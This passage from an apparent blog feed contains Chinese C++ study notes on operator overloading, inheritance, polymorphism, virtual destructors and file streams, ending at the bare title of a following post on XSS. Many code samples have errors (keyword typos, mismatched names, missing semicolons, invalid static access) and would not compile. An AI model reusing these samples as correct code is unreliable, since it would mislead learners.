num;<br>&#125;;<br></code></pre></td></tr></table></figure><p>后置<code>++</code>时，<code>++</code>在后，先完成的是输出值，随后进行自增，因此我们输出的结果是自增前的值</p><h4 id="赋值运算符重载">赋值运算符重载</h4><p><code>C++</code>编译器至少给一个类添加 4 个函数</p><ol><li>默认构造函数</li><li>默认析构函数</li><li>默认拷贝函数，对属性进行值拷贝</li><li>赋值运算符<code>operator=</code>对属性进行值拷贝</li></ol><p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br><span class="hljs-keyword">this</span>-&gt;age = <span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(age)<br>&#125;<br>    ~<span class="hljs-built_in">Person</span>()&#123;<br><span class="hljs-keyword">if</span>(age!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> age;<br>            age = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    Person&amp; <span class="hljs-keyword">operator</span> = (Person &amp;p)&#123;<br><span class="hljs-keyword">if</span> (age!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> age;<br>            age = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        age = <span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(*p.age);<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>    &#125;<br><span class="hljs-keyword">int</span>* age;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="关系运算符重载">关系运算符重载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br><span class="hljs-keyword">this</span>-&gt;age = <span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(age)<br>&#125;<br>    ~<span class="hljs-built_in">Person</span>()&#123;<br><span class="hljs-keyword">if</span>(age!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> age;<br>            age = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> == (Person &amp;p)&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;age==p.age)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> != (Person &amp;p)&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;age==p.age)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="函数调用运算符重载">函数调用运算符重载</h4><ul><li><p>函数调用<code>()</code>也可以重载</p></li><li><p>用于重载后使用的方式非常像函数的的调用，因此称为仿函数</p></li><li><p>仿函数没有固定写法，非常灵活</p></li></ul><h5 id="简单的加法实现">简单的加法实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">class <span class="hljs-title">MyAdd</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num1,<span class="hljs-keyword">int</span> num2)</span></span>&#123;<br><span class="hljs-keyword">return</span> num1+num2;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>MyAdd myadd;<br><span class="hljs-keyword">int</span> ret = <span class="hljs-built_in">myadd</span>(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<br>cout&lt;&lt;ret;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="使用匿名函数对象实现">使用匿名函数对象实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">class <span class="hljs-title">MyAdd</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num1,<span class="hljs-keyword">int</span> num2)</span></span>&#123;<br><span class="hljs-keyword">return</span> num1+num2;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cout&lt;&lt;<span class="hljs-built_in">MyAdd</span>()(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="继承">继承</h3><h4 id="基本语法">基本语法</h4><p>语法：<code>class 子类 : 继承方式 父类</code></p><p>子类也称为派生类，父类也称为基类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">YYY</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">common</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">// XXX</span><br>    &#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XXX</span> :</span> <span class="hljs-keyword">public</span> YYY<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">special</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;someting special&quot;</span>&lt;&lt;endl;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>继承可以减少重复的代码，派生类中的成员包含两大部分：</p><ul><li><p>一类是从积累继承过来的，一类是自己增加的成员</p></li><li><p>从基类继承过来的表现其共性，而新增的成员体现了其个性</p></li></ul><h4 id="继承方式">继承方式</h4><p>继承方式有三种：公共继承、保护继承、私有继承</p><p><img src="https://s2.loli.net/2022/09/15/gR2jitCBb5OvPZL.png" alt=""></p><h4 id="继承中的对象模型">继承中的对象模型</h4><p>父类中的私有成员只是被隐藏了，但是还是会继承下去</p><p>我们可以通过<code>VS</code>的开发人员命令提示符，来大型我们想要查看的类的结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cl /d1 reportSingleClassLayout&lt;class name&gt; &lt;file name&gt;<br></code></pre></td></tr></table></figure><h4 id="继承中构造和析构顺序">继承中构造和析构顺序</h4><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p><p>那么便会产生一个问题，父类与子类的构造函数和析构函数是谁先谁后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base</span>()&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;1&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">Base</span>()&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;2&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Son</span>:</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Base</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Son</span>()&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;3&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">Son</span>()&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;4&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们构造上面的例子我们调用<code>Son</code>类型时，其输出的值顺序为<code>1342</code>，说明继承中先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p><h4 id="继承中同名成员处理方式">继承中同名成员处理方式</h4><p>当父类与子类中出现同名的成员我们进行访问对应成员时需要注意：</p><p>访问子类同名成员直接访问即可，当访问父类同名成员时需要加上作用域</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;子类名&gt;</span>.<span class="hljs-attribute">&lt;父类名&gt;</span>::<span class="hljs-attribute">&lt;参数&gt;</span><br></code></pre></td></tr></table></figure><p>如果子类中出现了和父类同名的成员函数，子类的同名成员会隐藏掉父类中所所有同名成员函数</p><h4 id="继承中同名静态成员处理方式">继承中同名静态成员处理方式</h4><p>与同名非静态成员的处理方式一样，访问子类同名成员直接访问即可，当访问父类同名成员时需要加上作用域</p><p>我们可以通过对象方式进行访问或者我们可以通过类名加上对应作用域来进行访问</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> a;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span>:</span><span class="hljs-keyword">public</span> F&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> b;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>S s;<br><span class="hljs-comment">// 通过对象访问</span><br>cout&lt;&lt;s.b&lt;&lt;endl;<br>cout&lt;&lt;s.F::a&lt;&lt;endl;<br><br><span class="hljs-comment">// 通过类名访问</span><br>cout&lt;&lt;S::b&lt;&lt;endl;<br><span class="hljs-comment">// 第一个::代表通过类名访问，第二个::代表访问父类作用域下</span><br>cout&lt;&lt;S::F::a&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于成员同名静态成员函数，也会隐藏父类中所有同名成员函数，如果想访问父类中静态成员函数，需要同样加上对应作用域</p><h4 id="多继承语法">多继承语法</h4><p>语法：<code>class 子类:继承方式 父类1 , 继承方式 父类2</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseA</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">BaseA</span>()&#123;<br>a = <span class="hljs-number">100</span>;<br>&#125;<br><span class="hljs-keyword">int</span> a;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseB</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">BaseB</span>()&#123;<br>b = <span class="hljs-number">200</span>;<br>&#125;<br><span class="hljs-keyword">int</span> b;<br><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Son</span>:</span><span class="hljs-keyword">public</span> BaseA,<span class="hljs-keyword">public</span> BaseB&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> s;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cout&lt;&lt;Son::s&lt;&lt;endl;<br>cout&lt;&lt;Son::BaseA::a&lt;&lt;endl;<br>cout&lt;&lt;Son::BaseB::b&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="菱形继承">菱形继承</h4><p><strong>概念</strong>：两个派生类继承同一个基类，又有某个类同时继承两个派生类，这种继承被称为菱形继承</p><p>当我们继承了两个类时，我们可以意识到这两个类都继承了基类，那么基类便会有重复，因此我们需要解决这个问题,我们可以采用虚继承来解决这个问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>&#123;</span> <span class="hljs-comment">// 虚基类</span><br>pubilic:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br><span class="hljs-comment">// 利用虚继承来解决菱形继承的问题</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">camel</span>:</span><span class="hljs-keyword">virtual</span> Animal&#123;&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sheep</span>:</span><span class="hljs-keyword">virtual</span> Animal&#123;&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">alpaca</span>:</span><span class="hljs-keyword">public</span> camel,<span class="hljs-keyword">public</span> sheep&#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>alpaca T;<br>T.sheep::age = <span class="hljs-number">10</span>;<br>T.camel::age = <span class="hljs-number">20</span>;<br>cout &lt;&lt; T.sheep::age &lt;&lt;endl;<br>cout &lt;&lt; T.camel::age &lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多态">多态</h3><p>多态优点：</p><ul><li>代码组织结构清晰</li><li>可读性强</li><li>利于前期和后期的扩展以及维护</li></ul><p>多态分为两类：</p><ul><li>静态多态：函数重载和运算符重载属于静态多态，复用函数名</li><li>动态多态：派生类和虚函数实现运行时多态</li></ul><p>两者区别：</p><ul><li>静态多态的函数地址早绑定 - 编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定 - 运行阶段确定函数地址</li></ul><p>如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>&#123;</span><br>pubulic:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;saying&quot;</span> &lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cat</span>:</span><span class="hljs-keyword">public</span> Animal&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;cat is saying&quot;</span> &lt;&lt;endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doSpeak</span><span class="hljs-params">(Animal &amp;annimal)</span></span>&#123;<br>animal.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Cat cat;<br><span class="hljs-built_in">doSpeak</span>(cat); <span class="hljs-comment">// C++ 中允许父子类型的直接转换</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中可以显示出的是<code>saying</code>，这是因为执行说话的函数地址早绑定，在编译阶段就可以确定函数的地址，加入我们想要让输出的是<code>cat is saying</code>那么这个函数的地址就不能提前绑定，需要在运行阶段中进行晚绑定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>&#123;</span><br>pubulic:<br>    <span class="hljs-comment">// 函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-comment">// 使用虚函数来进行晚绑定</span><br>cout &lt;&lt; <span class="hljs-string">&quot;saying&quot;</span> &lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cat</span>:</span><span class="hljs-keyword">public</span> Animal&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;cat is saying&quot;</span> &lt;&lt;endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doSpeak</span><span class="hljs-params">(Animal &amp;annimal)</span></span>&#123;<br>animal.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Cat cat;<br><span class="hljs-built_in">doSpeak</span>(cat); <span class="hljs-comment">// C++ 中允许父子类型的直接转换</span><br>&#125;<br></code></pre></td></tr></table></figure><p>动态多态需要满足有继承关系，子类要重写父类的虚函数</p><p>动态多态使用，父类的指针或者引用指向子类对象</p><h4 id="多态原理分析">多态原理分析</h4><p>当我们使用<code>virtual</code>关键字时，其会创建一个虚函数(表)指针 ———— <code>vfptr</code>占4字节</p><p>我们子类继承使用<code>virtual</code>时便会将父类中的虚函数表指针进行替换，替换成子类自己的函数指针，因此当父类的指针或者引用指向子类对象的时候发生多态</p><h4 id="纯虚函数和抽象类">纯虚函数和抽象类</h4><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p><p>因此我们可以将虚函数改为纯虚函数，对应语法：<code>virtual 返回值类型 函数名 (参数列表) = 0</code>，当类中有了存虚函数，这个类也称为抽象类</p><p><code>抽象类特点</code>：</p><ul><li>无法实例化对象</li><li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li></ul><p>如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// =0 为纯说明符，不可以改成其他的</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">//子类必须重写父类中的纯虚函数，否则无法实例化对象</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Son</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以理解为我们父类提供一个指向，需要通过子类来进行实现具体的过程，因此我们在每次扩展功能时不需要去修改原来的代码，仅需要往后扩展即可。</p><h4 id="虚析构和纯虚析构">虚析构和纯虚析构</h4><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p><p>解决方式：将父类中的析构函数改为虚析构或者纯虚析构</p><p>虚析构和纯虚构共性：</p><ul><li>可以解决父类指针释放子类对象</li><li>都需要有具体的函数实现</li></ul><p>虚析构和纯系析构区别：如果是纯虚析构，该类属于抽象类，无法实例化对象</p><p>虚析构语法：<code>virtual ~类名()&#123;&#125;</code></p><p>虚析构语法：<code>virtual ~类名() = 0; 类名::~类名()&#123;&#125;</code></p><blockquote><p>虚析构和纯虚构函数都必须有相应实现</p></blockquote><p>父类指针在析构的时候不会调用子类的析构函数，因此父类指针释放子类对象时会存在不干净的问题。</p><blockquote><p>虚析构和纯虚析构就是用来解决通过父类指针释放子类对象</p><p>如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p><p>用于纯虚析构函数的类也属于抽象类</p></blockquote><h2 id="文件操作">文件操作</h2><p><code>C++</code>中的文件操作需要包含头文件<code>#include &lt;fstream&gt;</code></p><p>操作文件的三大类：</p><ol><li><code>ofstream</code>：写操作</li><li><code>ifstream</code>：读操作</li><li><code>fstream</code>：读写操作</li></ol><p>创建流对象：<code>ofstream ofs</code></p><p>打开文件：<code>ofs.open(&quot;&lt;file path&gt;&quot;,&lt;mode&gt;)</code></p><blockquote><table><thead><tr><th style="text-align:center">打开方式</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">ios::in</td><td style="text-align:center">读文件</td></tr><tr><td style="text-align:center">ios::out</td><td style="text-align:center">写文件</td></tr><tr><td style="text-align:center">ios::ate</td><td style="text-align:center">初始位置：文件尾</td></tr><tr><td style="text-align:center">ios::app</td><td style="text-align:center">追加方式写文件</td></tr><tr><td style="text-align:center">ios::trunc</td><td style="text-align:center">如果文件存在先删除，再创建</td></tr><tr><td style="text-align:center">ios::binary</td><td style="text-align:center">二进制方式</td></tr></tbody></table><p>注意：文件打开方式可以配合使用，使用<code>|</code>操作符</p></blockquote><p>写数据：<code>ofs &lt;&lt; &quot;XXX&quot;;</code></p><p>关闭文件：<code>ofs.close()</code></p><p><strong>读文件</strong></p><p>使用<code>&gt;&gt;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">ifstream ifs;<br>ifs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xxx&quot;</span>,ios::in);<br><span class="hljs-keyword">char</span> buff[<span class="hljs-number">1024</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">while</span>(ifs &gt;&gt; buff)&#123;<br>cout &lt;&lt; buff &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>getline()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">ifstream ifs;<br>ifs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xxx&quot;</span>,ios::in);<br><span class="hljs-keyword">char</span> buff[<span class="hljs-number">1024</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">while</span>(ifs.<span class="hljs-built_in">getline</span>(buf,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buff)))&#123;<br>cout &lt;&lt; buff &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">ifstream ifs;<br>ifs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xxx&quot;</span>,ios::in);<br><span class="hljs-keyword">char</span> buff[<span class="hljs-number">1024</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">getline</span>(ifs,buff))&#123;<br>cout &lt;&lt; buff &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>get()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">ifstream ifs;<br>ifs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xxx&quot;</span>,ios::in);<br><span class="hljs-keyword">char</span> buff[<span class="hljs-number">1024</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">while</span>((c = ifs.<span class="hljs-built_in">get</span>()) != EOF )&#123;<br>cout &lt;&lt; c &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Programming</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS 攻击</title>
    <link href="/2022/09/05/XSS%20%E6%94%BB%E5%87%BB/"/>
    <url>/2022/09/05/XSS%20%E6%94%BB%E5%87%BB/</url>
    
